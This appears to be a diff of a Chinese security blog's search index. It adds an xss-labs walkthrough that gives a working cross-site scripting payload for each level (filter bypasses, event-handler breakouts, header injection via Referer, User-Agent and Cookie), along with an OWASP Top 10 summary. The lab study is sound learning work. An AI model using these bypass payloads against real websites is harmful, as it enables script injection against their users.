@@ -191,6 +191,162 @@ return $outText;#新值
       </tags>
   </entry>
   <entry>
+    <title>xss-labs</title>
+    <url>/2023/05/17/xss-labs/</url>
+    <content><![CDATA[<h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><p>phpstudy</p>
+<h2 id="二、内容"><a href="#二、内容" class="headerlink" title="二、内容"></a>二、内容</h2><h3 id="1-level1"><a href="#1-level1" class="headerlink" title="1.level1"></a>1.level1</h3><p>url中添加</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;11&quot;)&lt;/script&gt;即可</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-level2-html实体化-lt-gt"><a href="#2-level2-html实体化-lt-gt" class="headerlink" title="2.level2(html实体化&lt;&gt;)"></a>2.level2(html实体化&lt;&gt;)</h3><p>输入level1中的值，发现&lt;&gt;被实体化了。</p>
+<p>构造input闭合</p>
+<p><code>&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
+<h3 id="3-level3-html实体化”-lt-gt"><a href="#3-level3-html实体化”-lt-gt" class="headerlink" title="3.level3(html实体化”&lt;&gt;)"></a>3.level3(html实体化”&lt;&gt;)</h3><p>经过试验单引号不会被转义</p>
+<p>构造onmouseover事件，即鼠标触碰到input标签即还行该事件</p>
+<p><code>&#39; onmouseover=javascript:alert(1) &#39;</code></p>
+<h3 id="4-level4-html实体化’-lt-gt"><a href="#4-level4-html实体化’-lt-gt" class="headerlink" title="4.level4(html实体化’&lt;&gt;)"></a>4.level4(html实体化’&lt;&gt;)</h3><p>很好，单引号、尖括号没了</p>
+<p><code>&quot; onmouseover=javascript:alert(1) &quot;</code></p>
+<h3 id="5-level5-伪协议"><a href="#5-level5-伪协议" class="headerlink" title="5.level5(伪协议)"></a>5.level5(伪协议)</h3><p>script、onmouserover等中间会加个_符号</p>
+<p>知识点：伪协议：在url中调用js方法，如Data伪协议与Javascript协议</p>
+<p><code>&quot;&gt;&lt;a href=javascript:alert(&quot;123&quot;)&gt;&quot;</code></p>
+<p>点击链接跳转即可</p>
+<p>参考：<a href="https://blog.csdn.net/qq_33181292/article/details/117251090?ops_request_misc=&request_id=&biz_id=102&utm_term=xss%E4%BC%AA%E5%8D%8F%E8%AE%AE&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-117251090.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">XSS_伪协议与编码绕过_伪协议绕过_南部余额的博客-CSDN博客</a></p>
+<p>​		<a href="https://blog.csdn.net/K_ShenH/article/details/122765092?ops_request_misc=%7B%22request_id%22:%22168440472216800197061493%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168440472216800197061493&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-122765092-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=xss-labs&spm=1018.2226.3001.4187">xss-labs搭建及通关攻略_Lydia_Ha的博客-CSDN博客</a></p>
+<h3 id="6-level6-小写过滤"><a href="#6-level6-小写过滤" class="headerlink" title="6.level6(小写过滤)"></a>6.level6(小写过滤)</h3><p>在script的基础上，href、src、oneerror什么的中间也加符号了</p>
+<p>但没有大写过滤</p>
+<p><code>&quot;&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</code></p>
+<h3 id="7-level7-标签名过滤"><a href="#7-level7-标签名过滤" class="headerlink" title="7.level7(标签名过滤)"></a>7.level7(标签名过滤)</h3><p>src啊,&lt;&gt;script啊都被删了、on啊</p>
+<p>双写绕过</p>
+<p><code>&quot;&gt;&lt;SCRscriptIPT&gt;alert(1)&lt;/SCRscriptIPT&gt;</code></p>
+<h3 id="8-level8-unicode编码"><a href="#8-level8-unicode编码" class="headerlink" title="8.level8(unicode编码)"></a>8.level8(unicode编码)</h3><p>它把输入框的值放在了a标签的href里</p>
+<p>scr字符后面会放_符号，且大写会被转化为小写</p>
+<p>引号也实体化了</p>
+<p>将代码进行unicode编码即可</p>
+<p>如<code>javascript:alert(1)</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.matools.com/code-convert-unicode">在线Unicode编码解码 - 码工具 (matools.com)</a></p>
+<h3 id="level9-继续过滤"><a href="#level9-继续过滤" class="headerlink" title="level9(继续过滤)"></a>level9(继续过滤)</h3><p>还是把输入框的值放在了a标签的href里，但是unicode编码不能用咯</p>
+<p>知识点:strpos()查找字符串在另一字符串中第一次出现的位置。</p>
+<p>源码有strpos函数过滤，限制输入内容必须有http:&#x2F;&#x2F;</p>
+<p><code>javas&amp;#99;ript:alert(&#39;http://123&#39;)</code></p>
+<p>部分源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span><br><span class="line">echo &#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(false===strpos($str7,&#x27;http://&#x27;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level10-隐藏参数"><a href="#level10-隐藏参数" class="headerlink" title="level10(隐藏参数)"></a>level10(隐藏参数)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>url被符号实体化了。</p>
+<p>从t_sort输入框下手，仅仅替换了尖括号。</p>
+<p>给input加一个onclick事件</p>
+<p>如<code>onclick=alert(1)</code></p>
+<p>记得去掉type的hide属性</p>
+<h3 id="level11-Referer"><a href="#level11-Referer" class="headerlink" title="level11(Referer)"></a>level11(Referer)</h3><p>同level10</p>
+<p>但是应该不对，怎么会有同一种解法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>第四行明显是说Reffer</p>
+<p>bp时</p>
+<p><code>Referer:&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520113437383.png" alt="image-20230520113437383"></p>
+<h3 id="level12（代理）"><a href="#level12（代理）" class="headerlink" title="level12（代理）"></a>level12（代理）</h3><p>f12，看得t_ua</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;t_ua&quot; value=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>bp时，很明显是</p>
+<p><code>User-Agent:&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
+<h3 id="level13-Cookie"><a href="#level13-Cookie" class="headerlink" title="level13(Cookie)"></a>level13(Cookie)</h3><p>f12，看到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;t_cook&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这应该提示了cookie</p>
+<p>bp试试</p>
+<p><code>Cookie: user=&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
+<h3 id="level14-exif"><a href="#level14-exif" class="headerlink" title="level14(exif)"></a>level14(exif)</h3><p>待解决</p>
+<h3 id="level15-ngInclude"><a href="#level15-ngInclude" class="headerlink" title="level15(ngInclude)"></a>level15(ngInclude)</h3><p>url:</p>
+<p><code>http://localhost:81/xss-labs/level15.php?src=1.gif</code></p>
+<p>f12出现这个：</p>
+<p><img src="/../../../Typora/img111/image-20230520133632333.png" alt="image-20230520133632333"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>知识点：ng-include</p>
+<p>ng-include是angular js的东西，类似php函数中的include函数，即包含文件。</p>
+<p>1、ng-include 指令用于包含外部的 HTML文件。</p>
+<p>2、包含的内容将作为指定元素的子节点。</p>
+<p>3、ng-include 属性的值可以是一个表达式，返回一个文件名。</p>
+<p>4、默认情况下，包含的文件需要包含在同一个域名下。</p>
+<p>值得注意的是：</p>
+<p>ng-include,如果单纯指定地址，必须要加引号</p>
+<p>ng-include,加载外部html，script标签中的内容不执行</p>
+<p>ng-include,加载外部html中含有style标签样式可以识别<br>参考：<a href="https://blog.csdn.net/RuoLi_s/article/details/112690177?ops_request_misc=&request_id=&biz_id=102&utm_term=xss-labs%E9%80%9A%E5%85%B3&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-112690177.first_rank_v2_pc_rank_v29&spm=1018.2226.3001.4187">xss-labs通关挑战（xss challenge）_RuoLi_s的博客-CSDN博客</a></p>
+<p>把其他存在xss漏洞的文件包含进来。</p>
+<p><code>src=&#39;level1.php?name=&lt;a href=javascript:alert(1)&gt;&#39;</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520135939252.png" alt="image-20230520135939252"></p>
+<h3 id="level16-空格绕过"><a href="#level16-空格绕过" class="headerlink" title="level16(空格绕过)"></a>level16(空格绕过)</h3><p>源代码为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>主要是script替换了，空格实体化了，”&#x2F;“也没了</p>
+<p>试试img，并且替换个空格</p>
+<p>%0a试试。</p>
+<p><code>keyword=</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520142552842.png" alt="image-20230520142552842"></p>
+<h3 id="level17-18-参数拼接"><a href="#level17-18-参数拼接" class="headerlink" title="level17-18(参数拼接)"></a>level17-18(参数拼接)</h3><p>url两个参数，中间有&#x3D;</p>
+<p><code>arg01=%20onmouseover&amp;arg02=alert(1)</code></p>
+<p>onmouseover前加个空格</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520154125903.png" alt="image-20230520154125903"></p>
+<p>level18同理。</p>
+<h3 id="level19-20-Flash反编译"><a href="#level19-20-Flash反编译" class="headerlink" title="level19-20(Flash反编译)"></a>level19-20(Flash反编译)</h3><p>待解决</p>
+]]></content>
+      <categories>
+        <category>xss</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>xss</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>owasp top10漏洞</title>
+    <url>/2023/05/13/owasp-top10%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="1-注入漏洞原理："><a href="#1-注入漏洞原理：" class="headerlink" title="1.注入漏洞原理："></a>1.注入漏洞原理：</h2><p>（Injection）攻击者向应用程序中输入恶意代码，使其执行未经授权的操作。 </p>
+<p>攻击方式：SQL注入、LDAP注入、OS命令注入等。</p>
+<p> 防御方法：使用参数化查询、输入校验和白名单、最小化权限等。</p>
+<h2 id="2-认证和授权漏洞原理："><a href="#2-认证和授权漏洞原理：" class="headerlink" title="2.认证和授权漏洞原理："></a>2.认证和授权漏洞原理：</h2><p>（Authentication and Authorization） 攻击者绕过或破解应用程序的身份验证和授权机制，以获取未经授权的访问权限。 </p>
+<p>攻击方式：密码猜测、会话劫持、CSRF等。</p>
+<p> 防御方法：强密码策略、多因素身份验证、会话管理、访问控制等。</p>
+<h2 id="3-垂直越权漏洞原理："><a href="#3-垂直越权漏洞原理：" class="headerlink" title="3.垂直越权漏洞原理："></a>3.垂直越权漏洞原理：</h2><p>（Sensitive Data Exposure） 应用程序在未加密或未正确加密的情况下存储和传输敏感信息。 </p>
+<p>攻击方式：网络嗅探、数据泄露等。 </p>
+<p>防御方法：加密、数据保护、强密码策略等。</p>
+<h2 id="4-XML外部实体漏洞原理："><a href="#4-XML外部实体漏洞原理：" class="headerlink" title="4.XML外部实体漏洞原理："></a>4.XML外部实体漏洞原理：</h2><p>（XML External Entities (XXE)） 应用程序解析XML时，未正确处理外部实体，导致攻击者可以访问系统文件、执行命令等。</p>
+<p> 攻击方式：XXE攻击等。</p>
+<p> 防御方法：禁用外部实体、使用最新版本的XML解析器、输入校验等。</p>
+<h2 id="5-失效的访问控制漏洞原理："><a href="#5-失效的访问控制漏洞原理：" class="headerlink" title="5.失效的访问控制漏洞原理："></a>5.失效的访问控制漏洞原理：</h2><p>（Broken Access Control） 应用程序未正确实现访问控制机制，导致攻击者能够访问未授权的资源。 </p>
+<p>攻击方式：直接访问、暴力破解等。 </p>
+<p>防御方法：访问控制、安全编码、安全测试等。</p>
+<h2 id="6-安全配置错误漏洞原理："><a href="#6-安全配置错误漏洞原理：" class="headerlink" title="6.安全配置错误漏洞原理："></a>6.安全配置错误漏洞原理：</h2><p>（Security Misconfiguration） 应用程序或其环境未正确配置，导致攻击者可以访问敏感信息、执行未经授权的操作等。 </p>
+<p>攻击方式：目录遍历、错误页面泄露等。 </p>
+<p>防御方法：安全配置、代码审计、最小化权限等。</p>
+<h2 id="7-跨站脚本攻击漏洞原理："><a href="#7-跨站脚本攻击漏洞原理：" class="headerlink" title="7.跨站脚本攻击漏洞原理："></a>7.跨站脚本攻击漏洞原理：</h2><p>（Cross-Site Scripting (XSS)） 攻击者向应用程序中输入恶意脚本，使其在用户的浏览器中执行。 </p>
+<p>攻击方式：反射型XSS、存储型XSS等。</p>
+<p> 防御方法：输入校验、输出编码、HTTPOnly标记等。</p>
+<h2 id="8-不安全的反序列化漏洞原理："><a href="#8-不安全的反序列化漏洞原理：" class="headerlink" title="8.不安全的反序列化漏洞原理："></a>8.不安全的反序列化漏洞原理：</h2><p>（Insecure Deserialization）应用程序在反序列化数据时未正确验证其完整性和有效性，导致攻击者可以执行未经授权的代码。</p>
+<p> 攻击方式：注入恶意对象等。</p>
+<p> 防御方法：输入验证、使用最新版本的序列化器、最小化权限等。</p>
+<h2 id="9-使用含有已知漏洞的组件原理："><a href="#9-使用含有已知漏洞的组件原理：" class="headerlink" title="9.使用含有已知漏洞的组件原理："></a>9.使用含有已知漏洞的组件原理：</h2><p>（Using Components with Known Vulnerabilities） 应用程序使用已知存在漏洞的第三方组件，导致攻击者可以利用这些漏洞攻击应用程序。 </p>
+<p>攻击方式：利用已知漏洞等。</p>
+<p> 防御方法：使用最新版本的组件、实时跟踪漏洞等。</p>
+<h2 id="10-不足的日志记录与监控原理："><a href="#10-不足的日志记录与监控原理：" class="headerlink" title="10.不足的日志记录与监控原理："></a>10.不足的日志记录与监控原理：</h2><p>（Insufficient Logging &amp; Monitoring）应用程序未正确记录或监控其活动，导致攻击者可以执行未经授权的操作而不被检测。</p>
+<p> 攻击方式：暴力破解、DDoS攻击等。</p>
+<p> 防御方法：安全审计、日志监控、入侵检测等。</p>
+]]></content>
+      <categories>
+        <category>top10 漏洞</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>xss</tag>
+        <tag>RCE</tag>
+        <tag>upload</tag>
+        <tag>xxe</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>bandit(level 0-19)</title>
     <url>/2023/05/14/bandit-level-0-19/</url>
     <content><![CDATA[<h1 id="bandit"><a href="#bandit" class="headerlink" title="bandit"></a>bandit</h1><h2 id="字符作用"><a href="#字符作用" class="headerlink" title="字符作用"></a>字符作用</h2><blockquote>
@@ -373,102 +529,6 @@ return $outText;#新值
       </tags>
   </entry>
   <entry>
-    <title>owasp top10漏洞</title>
-    <url>/2023/05/13/owasp-top10%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="1-注入漏洞原理："><a href="#1-注入漏洞原理：" class="headerlink" title="1.注入漏洞原理："></a>1.注入漏洞原理：</h2><p>（Injection）攻击者向应用程序中输入恶意代码，使其执行未经授权的操作。 </p>
-<p>攻击方式：SQL注入、LDAP注入、OS命令注入等。</p>
-<p> 防御方法：使用参数化查询、输入校验和白名单、最小化权限等。</p>
-<h2 id="2-认证和授权漏洞原理："><a href="#2-认证和授权漏洞原理：" class="headerlink" title="2.认证和授权漏洞原理："></a>2.认证和授权漏洞原理：</h2><p>（Authentication and Authorization） 攻击者绕过或破解应用程序的身份验证和授权机制，以获取未经授权的访问权限。 </p>
-<p>攻击方式：密码猜测、会话劫持、CSRF等。</p>
-<p> 防御方法：强密码策略、多因素身份验证、会话管理、访问控制等。</p>
-<h2 id="3-垂直越权漏洞原理："><a href="#3-垂直越权漏洞原理：" class="headerlink" title="3.垂直越权漏洞原理："></a>3.垂直越权漏洞原理：</h2><p>（Sensitive Data Exposure） 应用程序在未加密或未正确加密的情况下存储和传输敏感信息。 </p>
-<p>攻击方式：网络嗅探、数据泄露等。 </p>
-<p>防御方法：加密、数据保护、强密码策略等。</p>
-<h2 id="4-XML外部实体漏洞原理："><a href="#4-XML外部实体漏洞原理：" class="headerlink" title="4.XML外部实体漏洞原理："></a>4.XML外部实体漏洞原理：</h2><p>（XML External Entities (XXE)） 应用程序解析XML时，未正确处理外部实体，导致攻击者可以访问系统文件、执行命令等。</p>
-<p> 攻击方式：XXE攻击等。</p>
-<p> 防御方法：禁用外部实体、使用最新版本的XML解析器、输入校验等。</p>
-<h2 id="5-失效的访问控制漏洞原理："><a href="#5-失效的访问控制漏洞原理：" class="headerlink" title="5.失效的访问控制漏洞原理："></a>5.失效的访问控制漏洞原理：</h2><p>（Broken Access Control） 应用程序未正确实现访问控制机制，导致攻击者能够访问未授权的资源。 </p>
-<p>攻击方式：直接访问、暴力破解等。 </p>
-<p>防御方法：访问控制、安全编码、安全测试等。</p>
-<h2 id="6-安全配置错误漏洞原理："><a href="#6-安全配置错误漏洞原理：" class="headerlink" title="6.安全配置错误漏洞原理："></a>6.安全配置错误漏洞原理：</h2><p>（Security Misconfiguration） 应用程序或其环境未正确配置，导致攻击者可以访问敏感信息、执行未经授权的操作等。 </p>
-<p>攻击方式：目录遍历、错误页面泄露等。 </p>
-<p>防御方法：安全配置、代码审计、最小化权限等。</p>
-<h2 id="7-跨站脚本攻击漏洞原理："><a href="#7-跨站脚本攻击漏洞原理：" class="headerlink" title="7.跨站脚本攻击漏洞原理："></a>7.跨站脚本攻击漏洞原理：</h2><p>（Cross-Site Scripting (XSS)） 攻击者向应用程序中输入恶意脚本，使其在用户的浏览器中执行。 </p>
-<p>攻击方式：反射型XSS、存储型XSS等。</p>
-<p> 防御方法：输入校验、输出编码、HTTPOnly标记等。</p>
-<h2 id="8-不安全的反序列化漏洞原理："><a href="#8-不安全的反序列化漏洞原理：" class="headerlink" title="8.不安全的反序列化漏洞原理："></a>8.不安全的反序列化漏洞原理：</h2><p>（Insecure Deserialization）应用程序在反序列化数据时未正确验证其完整性和有效性，导致攻击者可以执行未经授权的代码。</p>
-<p> 攻击方式：注入恶意对象等。</p>
-<p> 防御方法：输入验证、使用最新版本的序列化器、最小化权限等。</p>
-<h2 id="9-使用含有已知漏洞的组件原理："><a href="#9-使用含有已知漏洞的组件原理：" class="headerlink" title="9.使用含有已知漏洞的组件原理："></a>9.使用含有已知漏洞的组件原理：</h2><p>（Using Components with Known Vulnerabilities） 应用程序使用已知存在漏洞的第三方组件，导致攻击者可以利用这些漏洞攻击应用程序。 </p>
-<p>攻击方式：利用已知漏洞等。</p>
-<p> 防御方法：使用最新版本的组件、实时跟踪漏洞等。</p>
-<h2 id="10-不足的日志记录与监控原理："><a href="#10-不足的日志记录与监控原理：" class="headerlink" title="10.不足的日志记录与监控原理："></a>10.不足的日志记录与监控原理：</h2><p>（Insufficient Logging &amp; Monitoring）应用程序未正确记录或监控其活动，导致攻击者可以执行未经授权的操作而不被检测。</p>
-<p> 攻击方式：暴力破解、DDoS攻击等。</p>
-<p> 防御方法：安全审计、日志监控、入侵检测等。</p>
-]]></content>
-      <categories>
-        <category>top10 漏洞</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>xss</tag>
-        <tag>RCE</tag>
-        <tag>upload</tag>
-        <tag>xxe</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xss-labs</title>
-    <url>/2023/05/17/xss-labs/</url>
-    <content><![CDATA[<h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><p>phpstudy</p>
-<h2 id="二、内容"><a href="#二、内容" class="headerlink" title="二、内容"></a>二、内容</h2><h3 id="1-level1"><a href="#1-level1" class="headerlink" title="1.level1"></a>1.level1</h3><p>url中添加</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;11&quot;)&lt;/script&gt;即可</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-level2-html实体化-lt-gt"><a href="#2-level2-html实体化-lt-gt" class="headerlink" title="2.level2(html实体化&lt;&gt;)"></a>2.level2(html实体化&lt;&gt;)</h3><p>输入level1中的值，发现&lt;&gt;被实体化了。</p>
-<p>构造input闭合</p>
-<p><code>&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
-<h3 id="3-level3-html实体化”-lt-gt"><a href="#3-level3-html实体化”-lt-gt" class="headerlink" title="3.level3(html实体化”&lt;&gt;)"></a>3.level3(html实体化”&lt;&gt;)</h3><p>经过试验单引号不会被转义</p>
-<p>构造onmouseover事件，即鼠标触碰到input标签即还行该事件</p>
-<p><code>&#39; onmouseover=javascript:alert(1) &#39;</code></p>
-<h3 id="4-level4-html实体化’-lt-gt"><a href="#4-level4-html实体化’-lt-gt" class="headerlink" title="4.level4(html实体化’&lt;&gt;)"></a>4.level4(html实体化’&lt;&gt;)</h3><p>很好，单引号、尖括号没了</p>
-<p><code>&quot; onmouseover=javascript:alert(1) &quot;</code></p>
-<h3 id="5-level5-伪协议"><a href="#5-level5-伪协议" class="headerlink" title="5.level5(伪协议)"></a>5.level5(伪协议)</h3><p>script、onmouserover等中间会加个_符号</p>
-<p>知识点：伪协议：在url中调用js方法，如Data伪协议与Javascript协议</p>
-<p><code>&quot;&gt;&lt;a href=javascript:alert(&quot;123&quot;)&gt;&quot;</code></p>
-<p>点击链接跳转即可</p>
-<p>参考：<a href="https://blog.csdn.net/qq_33181292/article/details/117251090?ops_request_misc=&request_id=&biz_id=102&utm_term=xss%E4%BC%AA%E5%8D%8F%E8%AE%AE&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-117251090.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">XSS_伪协议与编码绕过_伪协议绕过_南部余额的博客-CSDN博客</a></p>
-<p>​		<a href="https://blog.csdn.net/K_ShenH/article/details/122765092?ops_request_misc=%7B%22request_id%22:%22168440472216800197061493%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168440472216800197061493&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-122765092-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=xss-labs&spm=1018.2226.3001.4187">xss-labs搭建及通关攻略_Lydia_Ha的博客-CSDN博客</a></p>
-<h3 id="6-level6-小写过滤"><a href="#6-level6-小写过滤" class="headerlink" title="6.level6(小写过滤)"></a>6.level6(小写过滤)</h3><p>在script的基础上，href、src、oneerror什么的中间也加符号了</p>
-<p>但没有大写过滤</p>
-<p><code>&quot;&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</code></p>
-<h3 id="7-level7-标签名过滤"><a href="#7-level7-标签名过滤" class="headerlink" title="7.level7(标签名过滤)"></a>7.level7(标签名过滤)</h3><p>src啊,&lt;&gt;script啊都被删了、on啊</p>
-<p>双写绕过</p>
-<p><code>&quot;&gt;&lt;SCRscriptIPT&gt;alert(1)&lt;/SCRscriptIPT&gt;</code></p>
-<h3 id="8-level8-unicode编码"><a href="#8-level8-unicode编码" class="headerlink" title="8.level8(unicode编码)"></a>8.level8(unicode编码)</h3><p>它把输入框的值放在了a标签的href里</p>
-<p>scr字符后面会放_符号，且大写会被转化为小写</p>
-<p>引号也实体化了</p>
-<p>将代码进行unicode编码即可</p>
-<p>如<code>javascript:alert(1)</code>：</p>
